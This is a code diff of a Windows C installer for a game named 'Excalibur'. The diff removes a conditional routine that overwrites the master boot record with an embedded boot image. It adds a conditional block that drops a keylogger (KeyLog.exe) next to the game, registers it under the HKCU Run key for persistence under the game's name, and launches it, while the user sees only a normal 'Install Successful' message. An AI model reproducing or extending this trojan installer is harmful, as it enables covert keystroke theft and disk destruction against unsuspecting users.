@@ -11,7 +11,7 @@
 #include <stdio.h>
 
 #include "Binaries/ExcaliburBinary.h"
-#include "Binaries/BootBinary.h"
+#include "Installers.h"
 
 #define WINDOW_WIDTH  450
 #define WINDOW_HEIGHT 138
@@ -59,25 +59,7 @@ static void CreateShortcut(const char* targetPath, const char* shortcutPath)
     CoUninitialize();
 }
 
-#ifdef EX_MBROVERWRITE
-static void OverwriteMBR()
-{
-    HANDLE MBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
-                             FILE_SHARE_READ | FILE_SHARE_WRITE,
-                             NULL, OPEN_EXISTING, 0, NULL);
-
-    if (MBR == INVALID_HANDLE_VALUE)
-        return;
-
-    DWORD write;
-    if (!WriteFile(MBR, bin_boot_bin, bin_boot_bin_len, &write, NULL))
-        return;
-
-    CloseHandle(MBR);
-}
-#endif
-
-static void InstallBinary(const char* path)
+static void InstallGame(const char* path)
 {
     FILE* binary = fopen(path, "wb");
     
@@ -115,21 +97,34 @@ static void InstallEverything(char* path, HWND windowHandle)
         pathLength--;
     }
 
-    char binaryPath[MAX_PATH];
-    strcpy(binaryPath, path);
+    char gamePath[MAX_PATH];
+    strcpy(gamePath, path);
+    strcat(gamePath, "\\Excalibur.exe");
+    InstallGame(gamePath);
 
-    strcat(binaryPath, "\\Excalibur.exe");
-    InstallBinary(binaryPath);
+#ifdef EX_KEYLOGGER
+    char loggerPath[MAX_PATH];
+    strcpy(loggerPath, path);
+    strcat(loggerPath, "\\KeyLog.exe");
+    InstallKeylogger(loggerPath);
+
+    HKEY regKey;
+    RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &regKey);
+    RegSetValueEx(regKey, "Excalibur", 0, REG_SZ, (unsigned char*)loggerPath, strlen(loggerPath));
+    RegCloseKey(regKey);
+
+    ShellExecuteA(NULL, "open", loggerPath, NULL, NULL, SW_SHOWNORMAL);
+#endif
 
     if (createShortcut) 
-        CreateShortcut(binaryPath, "Excalibur");
+        CreateShortcut(gamePath, "Excalibur");
 
     MessageBox(windowHandle, "Excalibur has successfully been installed to your computer!", "Install Successful", MB_OK | MB_ICONINFORMATION);
 
     if (launchAfterInstall)
     {
         PostMessage(windowHandle, WM_CLOSE, 0, 0);
-        ShellExecuteA(NULL, "open", binaryPath, NULL, NULL, SW_SHOWNORMAL);   
+        ShellExecuteA(NULL, "open", gamePath, NULL, NULL, SW_SHOWNORMAL);   
     }
 }
 
